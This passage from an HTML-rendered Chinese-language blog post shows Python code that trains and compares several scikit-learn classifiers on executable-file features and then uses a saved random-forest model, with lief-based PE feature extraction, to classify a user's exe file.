class="string">"437"</span>,<span class="string">"438"</span>,<span class="string">"439"</span>,<span class="string">"440"</span>,<span class="string">"441"</span>,<span class="string">"442"</span>,<span class="string">"443"</span>,<span class="string">"444"</span>,<span class="string">"445"</span>,<span class="string">"446"</span>,<span class="string">"447"</span>,<span class="string">"448"</span>,<span class="string">"449"</span>,<span class="string">"450"</span>,<span class="string">"451"</span>,<span class="string">"452"</span>,<span class="string">"453"</span>,<span class="string">"454"</span>,<span class="string">"455"</span>,<span class="string">"456"</span>,<span class="string">"457"</span>,<span class="string">"458"</span>,<span class="string">"459"</span>,<span class="string">"460"</span>,<span class="string">"461"</span>,<span class="string">"462"</span>,<span class="string">"463"</span>,<span class="string">"464"</span>,<span class="string">"465"</span>,<span class="string">"466"</span>,<span class="string">"467"</span>,<span class="string">"468"</span>,<span class="string">"469"</span>,<span class="string">"470"</span>,<span class="string">"471"</span>,<span class="string">"472"</span>,<span class="string">"473"</span>,<span class="string">"474"</span>,<span class="string">"475"</span>,<span class="string">"476"</span>,<span class="string">"477"</span>,<span class="string">"478"</span>,<span class="string">"479"</span>,<span class="string">"480"</span>,<span class="string">"481"</span>,<span class="string">"482"</span>,<span class="string">"483"</span>,<span class="string">"484"</span>,<span class="string">"485"</span>,<span class="string">"486"</span>]  <span class="comment"># 特征值命名</span></span><br><span class="line"></span><br><span class="line">def trans_multi(type):</span><br><span class="line">    return type</span><br><span class="line"></span><br><span class="line">dataset['type']=dataset['type'].apply(trans_multi)    <span class="comment">#提取并修改type为标签的列</span></span><br><span class="line"></span><br><span class="line"><span class="attr">x</span> = dataset[[<span class="string">"1"</span>,<span class="string">"2"</span>,<span class="string">"3"</span>,<span class="string">"4"</span>,<span class="string">"5"</span>,<span class="string">"6"</span>,<span class="string">"7"</span>,<span class="string">"8"</span>,<span class="string">"9"</span>,<span class="string">"10"</span>,<span class="string">"11"</span>,<span class="string">"332"</span>,<span class="string">"333"</span>,<span class="string">"334"</span>,<span class="string">"335"</span>,<span class="string">"336"</span>,<span class="string">"337"</span>,<span class="string">"338"</span>,<span class="string">"339"</span>,<span class="string">"340"</span>,<span class="string">"341"</span>,</span><br><span class="line">             <span class="string">"342"</span>,<span class="string">"343"</span>,<span class="string">"344"</span>,<span class="string">"345"</span>,<span class="string">"346"</span>,<span class="string">"347"</span>,<span class="string">"348"</span>,<span class="string">"349"</span>,<span class="string">"350"</span>,<span class="string">"351"</span>,<span class="string">"352"</span>,<span class="string">"353"</span>,<span class="string">"354"</span>,<span class="string">"355"</span>,<span class="string">"356"</span>,<span class="string">"357"</span>,<span class="string">"358"</span>,<span class="string">"359"</span>,<span class="string">"360"</span>,<span class="string">"361"</span>,</span><br><span class="line">             <span class="string">"362"</span>,<span class="string">"363"</span>,<span class="string">"364"</span>,<span class="string">"365"</span>,<span class="string">"366"</span>,<span class="string">"367"</span>,<span class="string">"368"</span>,<span class="string">"369"</span>,<span class="string">"370"</span>,<span class="string">"371"</span>,<span class="string">"372"</span>,<span class="string">"373"</span>,<span class="string">"374"</span>,<span class="string">"375"</span>,<span class="string">"376"</span>,<span class="string">"377"</span>,<span class="string">"378"</span>,<span class="string">"379"</span>,<span class="string">"380"</span>,<span class="string">"381"</span>,</span><br><span class="line">             <span class="string">"382"</span>,<span class="string">"383"</span>,<span class="string">"384"</span>,<span class="string">"385"</span>,<span class="string">"386"</span>,<span class="string">"387"</span>,<span class="string">"388"</span>,<span class="string">"389"</span>,<span class="string">"390"</span>,<span class="string">"391"</span>,<span class="string">"392"</span>,<span class="string">"393"</span>,<span class="string">"394"</span>,<span class="string">"395"</span>,<span class="string">"396"</span>,<span class="string">"397"</span>,<span class="string">"398"</span>,<span class="string">"399"</span>,<span class="string">"400"</span>,<span class="string">"401"</span>,</span><br><span class="line">             <span class="string">"402"</span>,<span class="string">"403"</span>,<span class="string">"404"</span>,<span class="string">"405"</span>,<span class="string">"406"</span>,<span class="string">"407"</span>,<span class="string">"408"</span>,<span class="string">"409"</span>,<span class="string">"410"</span>,<span class="string">"411"</span>,<span class="string">"412"</span>,<span class="string">"413"</span>,<span class="string">"414"</span>,<span class="string">"415"</span>,<span class="string">"416"</span>,<span class="string">"417"</span>,<span class="string">"418"</span>,<span class="string">"419"</span>,<span class="string">"420"</span>,<span class="string">"421"</span>,</span><br><span class="line">             <span class="string">"422"</span>,<span class="string">"423"</span>,<span class="string">"424"</span>,<span class="string">"425"</span>,<span class="string">"426"</span>,<span class="string">"427"</span>,<span class="string">"428"</span>,<span class="string">"429"</span>,<span class="string">"430"</span>,<span class="string">"431"</span>,<span class="string">"432"</span>,<span class="string">"433"</span>,<span class="string">"434"</span>,<span class="string">"435"</span>,<span class="string">"436"</span>,<span class="string">"437"</span>,<span class="string">"438"</span>,<span class="string">"439"</span>,<span class="string">"440"</span>,<span class="string">"441"</span>,</span><br><span class="line">             <span class="string">"442"</span>,<span class="string">"443"</span>,<span class="string">"444"</span>,<span class="string">"445"</span>,<span class="string">"446"</span>,<span class="string">"447"</span>,<span class="string">"448"</span>,<span class="string">"449"</span>,<span class="string">"450"</span>,<span class="string">"451"</span>,<span class="string">"452"</span>,<span class="string">"453"</span>,<span class="string">"454"</span>,<span class="string">"455"</span>,<span class="string">"456"</span>,<span class="string">"457"</span>,<span class="string">"458"</span>,<span class="string">"459"</span>,<span class="string">"460"</span>,<span class="string">"461"</span>,</span><br><span class="line">             <span class="string">"462"</span>,<span class="string">"463"</span>,<span class="string">"464"</span>,<span class="string">"465"</span>,<span class="string">"466"</span>,<span class="string">"467"</span>,<span class="string">"468"</span>,<span class="string">"469"</span>,<span class="string">"470"</span>,<span class="string">"471"</span>,<span class="string">"472"</span>,<span class="string">"473"</span>,<span class="string">"474"</span>,<span class="string">"475"</span>,<span class="string">"476"</span>,<span class="string">"477"</span>,<span class="string">"478"</span>,<span class="string">"479"</span>,<span class="string">"480"</span>,<span class="string">"481"</span>,<span class="string">"482"</span>,<span class="string">"483"</span>,<span class="string">"484"</span>,<span class="string">"485"</span>,<span class="string">"486"</span>]]</span><br><span class="line"><span class="attr">y</span> = dataset['type'] <span class="comment">#把标签和前面的特征分开','x作为特征','y作为相应的标签</span></span><br><span class="line"></span><br><span class="line">print(x.shape)  <span class="comment">#数据量 几条数据 , 几个特征</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">rfc_l</span> = []</span><br><span class="line"><span class="attr">clf_l</span> = []</span><br><span class="line"><span class="attr">ann_l</span> = []</span><br><span class="line"><span class="attr">svc_l</span> = []</span><br><span class="line"><span class="attr">mnb_l</span> = []</span><br><span class="line">for i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    <span class="attr">rfc</span> = RandomForestClassifier(<span class="attr">n_estimators=18)</span></span><br><span class="line">    <span class="attr">rfc_s</span> = cross_val_score(rfc, x, y, <span class="attr">cv=10).mean()</span>  <span class="comment"># 实例化的模型, 完成的特征, 完成的标签, cv交叉验证的次数 把数据分为十份 跑10次 每次9:1</span></span><br><span class="line">    rfc_l.append(rfc_s)</span><br><span class="line"></span><br><span class="line">    <span class="attr">clf</span> = DecisionTreeClassifier()</span><br><span class="line">    <span class="attr">clf_s</span> = cross_val_score(clf, x, y, <span class="attr">cv=10).mean()</span></span><br><span class="line">    clf_l.append(clf_s)</span><br><span class="line"></span><br><span class="line">    <span class="attr">ann</span> = MLPClassifier(<span class="attr">hidden_layer_sizes=[20],</span> <span class="attr">activation='logistic',</span> <span class="attr">solver='lbfgs',</span> <span class="attr">random_state=i)#</span> 选择logistic函数，lbfgs算法</span><br><span class="line">    <span class="attr">ann_s</span> = cross_val_score(ann, x, y, <span class="attr">cv=10).mean()</span></span><br><span class="line">    ann_l.append(ann_s)</span><br><span class="line"></span><br><span class="line">    <span class="attr">svc</span> = SVC(<span class="attr">C=0.025,</span> <span class="attr">kernel='linear',</span> <span class="attr">random_state=i)</span></span><br><span class="line">    <span class="attr">svc_s</span> = cross_val_score(svc, x, y, <span class="attr">cv=10).mean()</span></span><br><span class="line">    svc_l.append(svc_s)</span><br><span class="line"></span><br><span class="line">    <span class="attr">mnb</span> = MultinomialNB()</span><br><span class="line">    <span class="attr">mnb_s</span> = cross_val_score(mnb, x, y, <span class="attr">cv=10).mean()</span></span><br><span class="line">    mnb_l.append(mnb_s)</span><br><span class="line"></span><br><span class="line">plt.plot(range(<span class="number">1</span>,<span class="number">21</span>),rfc_l, <span class="attr">label="RandomForest")#</span> x的取值范围(交叉验证的次数), y值的取值, 这条线的标签</span><br><span class="line">plt.plot(range(<span class="number">1</span>,<span class="number">21</span>),clf_l, <span class="attr">label="DecisionTree")</span></span><br><span class="line">plt.plot(range(<span class="number">1</span>,<span class="number">21</span>),ann_l, <span class="attr">label="ANN")</span></span><br><span class="line">plt.plot(range(<span class="number">1</span>,<span class="number">21</span>),svc_l, <span class="attr">label="SVC")</span></span><br><span class="line">plt.plot(range(<span class="number">1</span>,<span class="number">21</span>),mnb_l, <span class="attr">label="Naive</span> Bayes<span class="string">")</span></span><br><span class="line"><span class="string">plt.legend()</span></span><br><span class="line"><span class="string">plt.show()</span></span><br></pre></td></tr></table></figure><h2 id="模型使用"><a href="#模型使用" class="headerlink" title="模型使用"></a>模型使用</h2><h3 id="usage-model"><a href="#usage-model" class="headerlink" title="usage_model"></a>usage_model</h3><p>载入保存下来的<code>rfc.model</code>来进行预测, 属于<code>ui.py</code>的后台程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> extract_pre</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn.externals <span class="keyword">import</span> joblib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Predict</span><span class="params">(inroad)</span>:</span></span><br><span class="line">    <span class="comment"># 载入模型</span></span><br><span class="line">    rfc=joblib.load(<span class="string">'./rfc.model'</span>)</span><br><span class="line">    <span class="comment"># 提取程序数据</span></span><br><span class="line">    data_extract=extract_pre.encode_pe(inroad)</span><br><span class="line">    <span class="comment"># 构建二维pd.dataframe</span></span><br><span class="line">    df = pd.DataFrame(columns=extract_pre.column_ID)</span><br><span class="line">    <span class="comment"># 写入提取出来的list数据</span></span><br><span class="line">    df.loc[len(df)] = data_extract</span><br><span class="line">    x = df[extract_pre.selected_feature]</span><br><span class="line">    <span class="comment"># 使用模型预测</span></span><br><span class="line">    result = rfc.predict(x)</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h3 id="extract-pre"><a href="#extract-pre" class="headerlink" title="extract_pre"></a>extract_pre</h3><p>提取的另外一个脚本,针对用户的目标输入<code>exe</code>的提取程序,用于提取预测对象的特征信息.(因为懒把前面的<code>extract</code>改成通用的, 所以就复制粘贴小改了一个). 唯一不同就是输出, 去掉了最后list里的标签,同时不传入<code>write_to_csv</code>直接以list的形式return</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line">import lief</span><br><span class="line">import numpy as np</span><br><span class="line">import<span class="built_in"> logging </span>as log</span><br><span class="line">import extract</span><br><span class="line"></span><br><span class="line">column_ID =[<span class="string">"1"</span>,<span class="string">"2"</span>,<span class="string">"3"</span>,<span class="string">"4"</span>,<span class="string">"5"</span>,<span class="string">"6"</span>,<span class="string">"7"</span>,<span class="string">"8"</span>,<span class="string">"9"</span>,<span class="string">"10"</span>,<span class="string">"11"</span>,<span class="string">"12"</span>,<span class="string">"13"</span>,<span class="string">"14"</span>,<span class="string">"15"</span>,<span class="string">"16"</span>,<span class="string">"17"</span>,<span class="string">"18"</span>,<span class="string">"19"</span>,<span class="string">"20"</span>,<span class="string">"21"</span>,<span class="string">"22"</span>,<span class="string">"23"</span>,<span class="string">"24"</span>,<span class="string">"25"</span>,<span class="string">"26"</span>,<span class="string">"27"</span>,<span class="string">"28"</span>,<span class="string">"29"</span>,<span class="string">"30"</span>,<span class="string">"31"</span>,<span class="string">"32"</span>,<span class="string">"33"</span>,<span class="string">"34"</span>,<span class="string">"35"</span>,<span class="string">"36"</span>,<span class="string">"37"</span>,<span class="string">"38"</span>,<span class="string">"39"</span>,<span class="string">"40"</span>,<span class="string">"41"</span>,<span class="string">"42"</span>,<span class="string">"43"</span>,<span class="string">"44"</span>,<span class="string">"45"</span>,<span class="string">"46"</span>,<span class="string">"47"</span>,<span class="string">"48"</span>,<span class="string">"49"</span>,<span class="string">"50"</span>,<span class="string">"51"</span>,<span class="string">"52"</span>,<span class="string">"53"</span>,<span class="string">"54"</span>,<span class="string">"55"</span>,<span class="string">"56"</span>,<span class="string">"57"</span>,<span class="string">"58"</span>,<span class="string">"59"</span>,<span class="string">"60"</span>,<span class="string">"61"</span>,<span class="string">"62"</span>,<span class="string">"63"</span>,<span class="string">"64"</span>,<span class="string">"65"</span>,<span class="string">"66"</span>,<span class="string">"67"</span>,<span class="string">"68"</span>,<span class="string">"69"</span>,<span class="string">"70"</span>,<span class="string">"71"</span>,<span class="string">"72"</span>,<span class="string">"73"</span>,<span class="string">"74"</span>,<span class="string">"75"</span>,<span class="string">"76"</span>,<span class="string">"77"</span>,<span class="string">"78"</span>,<span class="string">"79"</span>,<span class="string">"80"</span>,<span class="string">"81"</span>,<span class="string">"82"</span>,<span class="string">"83"</span>,<span class="string">"84"</span>,<span class="string">"85"</span>,<span class="string">"86"</span>,<span class="string">"87"</span>,<span class="string">"88"</span>,<span class="string">"89"</span>,<span class="string">"90"</span>,<span class="string">"91"</span>,<span class="string">"92"</span>,<span class="string">"93"</span>,<span class="string">"94"</span>,<span class="string">"95"</span>,<span class="string">"96"</span>,<span class="string">"97"</span>,<span class="string">"98"</span>,<span class="string">"99"</span>,<span class="string">"100"</span>,<span class="string">"101"</span>,<span class="string">"102"</span>,<span class="string">"103"</span>,<span class="string">"104"</span>,<span class="string">"105"</span>,<span class="string">"106"</span>,<span class="string">"107"</span>,<span class="string">"108"</span>,<span class="string">"109"</span>,<span class="string">"110"</span>,<span class="string">"111"</span>,<span class="string">"112"</span>,<span class="string">"113"</span>,<span class="string">"114"</span>,<span class="string">"115"</span>,<span class="string">"116"</span>,<span class="string">"117"</span>,<span class="string">"118"</span>,<span class="string">"119"</span>,<span class="string">"120"</span>,<span class="string">"121"</span>,<span class="string">"122"</span>,<span class="string">"123"</span>,<span class="string">"124"</span>,<span class="string">"125"</span>,<span class="string">"126"</span>,<span class="string">"127"</span>,<span class="string">"128"</span>,<span class="string">"129"</span>,<span class="string">"130"</span>,<span class="string">"131"</span>,<span class="string">"132"</span>,<span class="string">"133"</span>,<span class="string">"134"</span>,<span class="string">"135"</span>,<span class="string">"136"</span>,<span class="string">"137"</span>,<span class="string">"138"</span>,<span class="string">"139"</span>,<span class="string">"140"</span>,<span class="string">"141"</span>,<span class="string">"142"</span>,<span class="string">"143"</span>,<span class="string">"144"</span>,<span class="string">"145"</span>,<span class="string">"146"</span>,<span class="string">"147"</span>,<span class="string">"148"</span>,<span class="string">"149"</span>,<span class="string">"150"</span>,<span class="string">"151"</span>,<span class="string">"152"</span>,<span class="string">"153"</span>,<span class="string">"154"</span>,<span class="string">"155"</span>,<span class="string">"156"</span>,<span class="string">"157"</span>,<span class="string">"158"</span>,<span class="string">"159"</span>,<span class="string">"160"</span>,<span class="string">"161"</span>,<span class="string">"162"</span>,<span class="string">"163"</span>,<span class="string">"164"</span>,<span class="string">"165"</span>,<span class="string">"166"</span>,<span class="string">"167"</span>,<span class="string">"168"</span>,<span class="string">"169"</span>,<span class="string">"170"</span>,<span class="string">"171"</span>,<span class="string">"172"</span>,<span class="string">"173"</span>,<span class="string">"174"</span>,<span class="string">"175"</span>,<span class="string">"176"</span>,<span class="string">"177"</span>,<span class="string">"178"</span>,<span class="string">"179"</span>,<span class="string">"180"</span>,<span class="string">"181"</span>,<span class="string">"182"</span>,<span class="string">"183"</span>,<span class="string">"184"</span>,<span class="string">"185"</span>,<span class="string">"186"</span>,<span class="string">"187"</span>,<span class="string">"188"</span>,<span class="string">"189"</span>,<span class="string">"190"</span>,<span class="string">"191"</span>,<span class="string">"192"</span>,<span class="string">"193"</span>,<span class="string">"194"</span>,<span class="string">"195"</span>,<span class="string">"196"</span>,<span class="string">"197"</span>,<span class="string">"198"</span>,<span class="string">"199"</span>,<span class="string">"200"</span>,<span class="string">"201"</span>,<span class="string">"202"</span>,<span class="string">"203"</span>,<span class="string">"204"</span>,<span class="string">"205"</span>,<span class="string">"206"</span>,<span class="string">"207"</span>,<span class="string">"208"</span>,<span class="string">"209"</span>,<span class="string">"210"</span>,<span class="string">"211"</span>,<span class="string">"212"</span>,<span class="string">"213"</span>,<span class="string">"214"</span>,<span class="string">"215"</span>,<span class="string">"216"</span>,<span class="string">"217"</span>,<span class="string">"218"</span>,<span class="string">"219"</span>,<span class="string">"220"</span>,<span class="string">"221"</span>,<span class="string">"222"</span>,<span class="string">"223"</span>,<span class="string">"224"</span>,<span class="string">"225"</span>,<span class="string">"226"</span>,<span class="string">"227"</span>,<span class="string">"228"</span>,<span class="string">"229"</span>,<span class="string">"230"</span>,<span class="string">"231"</span>,<span class="string">"232"</span>,<span class="string">"233"</span>,<span class="string">"234"</span>,<span class="string">"235"</span>,<span class="string">"236"</span>,<span class="string">"237"</span>,<span class="string">"238"</span>,<span class="string">"239"</span>,<span class="string">"240"</span>,<span class="string">"241"</span>,<span class="string">"242"</span>,<span class="string">"243"</span>,<span class="string">"244"</span>,<span class="string">"245"</span>,<span class="string">"246"</span>,<span class="string">"247"</span>,<span class="string">"248"</span>,<span class="string">"249"</span>,<span class="string">"250"</span>,<span class="string">"251"</span>,<span class="string">"252"</span>,<span class="string">"253"</span>,<span class="string">"254"</span>,<span class="string">"255"</span>,<span class="string">"256"</span>,<span class="string">"257"</span>,<span class="string">"258"</span>,<span class="string">"259"</span>,<span class="string">"260"</span>,<span class="string">"261"</span>,<span class="string">"262"</span>,<span class="string">"263"</span>,<span class="string">"264"</span>,<span class="string">"265"</span>,<span class="string">"266"</span>,<span class="string">"267"</span>,<span class="string">"268"</span>,<span class="string">"269"</span>,<span class="string">"270"</span>,<span class="string">"271"</span>,<span class="string">"272"</span>,<span class="string">"273"</span>,<span class="string">"274"</span>,<span class="string">"275"</span>,<span class="string">"276"</span>,<span class="string">"277"</span>,<span class="string">"278"</span>,<span class="string">"279"</span>,<span class="string">"280"</span>,<span class="string">"281"</span>,<span class="string">"282"</span>,<span class="string">"283"</span>,<span class="string">"284"</span>,<span class="string">"285"</span>,<span class="string">"286"</span>,<span class="string">"287"</span>,<span class="string">"288"</span>,<span class="string">"289"</span>,<span class="string">"290"</span>,<span class="string">"291"</span>,<span class="string">"292"</span>,<span class="string">"293"</span>,<span class="string">"294"</span>,<span class="string">"295"</span>,<span class="string">"296"</span>,<span class="string">"297"</span>,<span class="string">"298"</span>,<span class="string">"299"</span>,<span class="string">"300"</span>,<span class="string">"301"</span>,<span class="string">"302"</span>,<span class="string">"303"</span>,<span class="string">"304"</span>,<span class="string">"305"</span>,<span class="string">"306"</span>,<span class="string">"307"</span>,<span class="string">"308"</span>,<span class="string">"309"</span>,<span class="string">"310"</span>,<span class="string">"311"</span>,<span class="string">"312"</span>,<span class="string">"313"</span>,<span class="string">"314"</span>,<span class="string">"315"</span>,<span class="string">"316"</span>,<span class="string">"317"</span>,<span class="string">"318"</span>,<span class="string">"319"</span>,<span class="string">"320"</span>,<span class="string">"321"</span>,<span class="string">"322"</span>,<span class="string">"323"</span>,<span class="string">"324"</span>,<span class="string">"325"</span>,<span class="string">"326"</span>,<span class="string">"327"</span>,<span class="string">"328"</span>,<span class="string">"329"</span>,<span class="string">"330"</span>,<span class="string">"331"</span>,<span class="string">"332"</span>,<span class="string">"333"</span>,<span class="string">"334"</span>,<span class="string">"335"</span>,<span class="string">"336"</span>,<span class="string">"337"</span>,<span class="string">"338"</span>,<span class="string">"339"</span>,<span class="string">"340"</span>,<span class="string">"341"</span>,<span class="string">"342"</span>,<span class="string">"343"</span>,<span class="string">"344"</span>,<span class="string">"345"</span>,<span class="string">"346"</span>,<span class="string">"347"</span>,<span class="string">"348"</span>,<span class="string">"349"</span>,<span class="string">"350"</span>,<span class="string">"351"</span>,<span class="string">"352"</span>,<span class="string">"353"</span>,<span class="string">"354"</span>,<span class="string">"355"</span>,<span class="string">"356"</span>,<span class="string">"357"</span>,<span class="string">"358"</span>,<span class="string">"359"</span>,<span class="string">"360"</span>,<span class="string">"361"</span>,<span class="string">"362"</span>,<span class="string">"363"</span>,<span class="string">"364"</span>,<span class="string">"365"</span>,<span class="string">"366"</span>,<span class="string">"367"</span>,<span class="string">"368"</span>,<span class="string">"369"</span>,<span class="string">"370"</span>,<span class="string">"371"</span>,<span class="string">"372"</span>,<span class="string">"373"</span>,<span class="string">"374"</span>,<span class="string">"375"</span>,<span class="string">"376"</span>,<span class="string">"377"</span>,<span class="string">"378"</span>,<span class="string">"379"</span>,<span class="string">"380"</span>,<span class="string">"381"</span>,<span class="string">"382"</span>,<span class="string">"383"</span>,<span class="string">"384"</span>,<span class="string">"385"</span>,<span class="string">"386"</span>,<span class="string">"387"</span>,<span class="string">"388"</span>,<span class="string">"389"</span>,<span class="string">"390"</span>,<span class="string">"391"</span>,<span class="string">"392"</span>,<span class="string">"393"</span>,<span class="string">"394"</span>,<span class="string">"395"</span>,<span class="string">"396"</span>,<span class="string">"397"</span>,<span class="string">"398"</span>,<span class="string">"399"</span>,<span class="string">"400"</span>,<span class="string">"401"</span>,<span class="string">"402"</span>,<span class="string">"403"</span>,<span class="string">"404"</span>,<span class="string">"405"</span>,<span class="string">"406"</span>,<span class="string">"407"</span>,<span class="string">"408"</span>,<span class="string">"409"</span>,<span class="string">"410"</span>,<span class="string">"411"</span>,<span class="string">"412"</span>,<span class="string">"413"</span>,<span class="string">"414"</span>,<span class="string">"415"</span>,<span class="string">"416"</span>,<span class="string">"417"</span>,<span class="string">"418"</span>,<span class="string">"419"</span>,<span class="string">"420"</span>,<span class="string">"421"</span>,<span class="string">"422"</span>,<span class="string">"423"</span>,<span class="string">"424"</span>,<span class="string">"425"</span>,<span class="string">"426"</span>,<span class="string">"427"</span>,<span class="string">"428"</span>,<span class="string">"429"</span>,<span class="string">"430"</span>,<span class="string">"431"</span>,<span class="string">"432"</span>,<span class="string">"433"</span>,<span class="string">"434"</span>,<span class="string">"435"</span>,<span class="string">"436"</span>,<span class="string">"437"</span>,<span class="string">"438"</span>,<span class="string">"439"</span>,<span class="string">"440"</span>,<span class="string">"441"</span>,<span class="string">"442"</span>,<span class="string">"443"</span>,<span class="string">"444"</span>,<span class="string">"445"</span>,<span class="string">"446"</span>,<span class="string">"447"</span>,<span class="string">"448"</span>,<span class="string">"449"</span>,<span class="string">"450"</span>,<span class="string">"451"</span>,<span class="string">"452"</span>,<span class="string">"453"</span>,<span class="string">"454"</span>,<span class="string">"455"</span>,<span class="string">"456"</span>,<span class="string">"457"</span>,<span class="string">"458"</span>,<span class="string">"459"</span>,<span class="string">"460"</span>,<span class="string">"461"</span>,<span class="string">"462"</span>,<span class="string">"463"</span>,<span class="string">"464"</span>,<span class="string">"465"</span>,<span class="string">"466"</span>,<span class="string">"467"</span>,<span class="string">"468"</span>,<span class="string">"469"</span>,<span class="string">"470"</span>,<span class="string">"471"</span>,<span class="string">"472"</span>,<span class="string">"473"</span>,<span class="string">"474"</span>,<span class="string">"475"</span>,<span class="string">"476"</span>,<span class="string">"477"</span>,<span class="string">"478"</span>,<span class="string">"479"</span>,<span class="string">"480"</span>,<span class="string">"481"</span>,<span class="string">"482"</span>,<span class="string">"483"</span>,<span class="string">"484"</span>,<span class="string">"485"</span>,<span class="string">"486"</span>]</span><br><span class="line">selected_feature=[<span class="string">"1"</span>,<span class="string">"2"</span>,<span class="string">"3"</span>,<span class="string">"4"</span>,<span class="string">"5"</span>,<span class="string">"6"</span>,<span class="string">"7"</span>,<span class="string">"8"</span>,<span class="string">"9"</span>,<span class="string">"10"</span>,<span class="string">"11"</span>,<span class="string">"332"</span>,<span class="string">"333"</span>,<span class="string">"334"</span>,<span class="string">"335"</span>,<span class="string">"336"</span>,<span class="string">"337"</span>,<span class="string">"338"</span>,<span class="string">"339"</span>,<span class="string">"340"</span>,<span class="string">"341"</span>,</span><br><span class="line">             <span class="string">"342"</span>,<span class="string">"343"</span>,<span class="string">"344"</span>,<span class="string">"345"</span>,<span class="string">"346"</span>,<span class="string">"347"</span>,<span class="string">"348"</span>,<span class="string">"349"</span>,<span class="string">"350"</span>,<span class="string">"351"</span>,<span class="string">"352"</span>,<span class="string">"353"</span>,<span class="string">"354"</span>,<span class="string">"355"</span>,<span class="string">"356"</span>,<span class="string">"357"</span>,<span class="string">"358"</span>,<span class="string">"359"</span>,<span class="string">"360"</span>,<span class="string">"361"</span>,</span><br><span class="line">             <span class="string">"362"</span>,<span class="string">"363"</span>,<span class="string">"364"</span>,<span class="string">"365"</span>,<span class="string">"366"</span>,<span class="string">"367"</span>,<span class="string">"368"</span>,<span class="string">"369"</span>,<span class="string">"370"</span>,<span class="string">"371"</span>,<span class="string">"372"</span>,<span class="string">"373"</span>,<span class="string">"374"</span>,<span class="string">"375"</span>,<span class="string">"376"</span>,<span class="string">"377"</span>,<span class="string">"378"</span>,<span class="string">"379"</span>,<span class="string">"380"</span>,<span class="string">"381"</span>,</span><br><span class="line">             <span class="string">"382"</span>,<span class="string">"383"</span>,<span class="string">"384"</span>,<span class="string">"385"</span>,<span class="string">"386"</span>,<span class="string">"387"</span>,<span class="string">"388"</span>,<span class="string">"389"</span>,<span class="string">"390"</span>,<span class="string">"391"</span>,<span class="string">"392"</span>,<span class="string">"393"</span>,<span class="string">"394"</span>,<span class="string">"395"</span>,<span class="string">"396"</span>,<span class="string">"397"</span>,<span class="string">"398"</span>,<span class="string">"399"</span>,<span class="string">"400"</span>,<span class="string">"401"</span>,</span><br><span class="line">             <span class="string">"402"</span>,<span class="string">"403"</span>,<span class="string">"404"</span>,<span class="string">"405"</span>,<span class="string">"406"</span>,<span class="string">"407"</span>,<span class="string">"408"</span>,<span class="string">"409"</span>,<span class="string">"410"</span>,<span class="string">"411"</span>,<span class="string">"412"</span>,<span class="string">"413"</span>,<span class="string">"414"</span>,<span class="string">"415"</span>,<span class="string">"416"</span>,<span class="string">"417"</span>,<span class="string">"418"</span>,<span class="string">"419"</span>,<span class="string">"420"</span>,<span class="string">"421"</span>,</span><br><span class="line">             <span class="string">"422"</span>,<span class="string">"423"</span>,<span class="string">"424"</span>,<span class="string">"425"</span>,<span class="string">"426"</span>,<span class="string">"427"</span>,<span class="string">"428"</span>,<span class="string">"429"</span>,<span class="string">"430"</span>,<span class="string">"431"</span>,<span class="string">"432"</span>,<span class="string">"433"</span>,<span class="string">"434"</span>,<span class="string">"435"</span>,<span class="string">"436"</span>,<span class="string">"437"</span>,<span class="string">"438"</span>,<span class="string">"439"</span>,<span class="string">"440"</span>,<span class="string">"441"</span>,</span><br><span class="line">             <span class="string">"442"</span>,<span class="string">"443"</span>,<span class="string">"444"</span>,<span class="string">"445"</span>,<span class="string">"446"</span>,<span class="string">"447"</span>,<span class="string">"448"</span>,<span class="string">"449"</span>,<span class="string">"450"</span>,<span class="string">"451"</span>,<span class="string">"452"</span>,<span class="string">"453"</span>,<span class="string">"454"</span>,<span class="string">"455"</span>,<span class="string">"456"</span>,<span class="string">"457"</span>,<span class="string">"458"</span>,<span class="string">"459"</span>,<span class="string">"460"</span>,<span class="string">"461"</span>,</span><br><span class="line">             <span class="string">"462"</span>,<span class="string">"463"</span>,<span class="string">"464"</span>,<span class="string">"465"</span>,<span class="string">"466"</span>,<span class="string">"467"</span>,<span class="string">"468"</span>,<span class="string">"469"</span>,<span class="string">"470"</span>,<span class="string">"471"</span>,<span class="string">"472"</span>,<span class="string">"473"</span>,<span class="string">"474"</span>,<span class="string">"475"</span>,<span class="string">"476"</span>,<span class="string">"477"</span>,<span class="string">"478"</span>,<span class="string">"479"</span>,<span class="string">"480"</span>,<span class="string">"481"</span>,<span class="string">"482"</span>,<span class="string">"483"</span>,<span class="string">"484"</span>,<span class="string">"485"</span>,<span class="string">"486"</span>]</span><br><span class="line"></span><br><span class="line">def encode_pe(filepath):</span><br><span class="line">    #<span class="builtin-name">print</span>(<span class="string">"encoding"</span>, 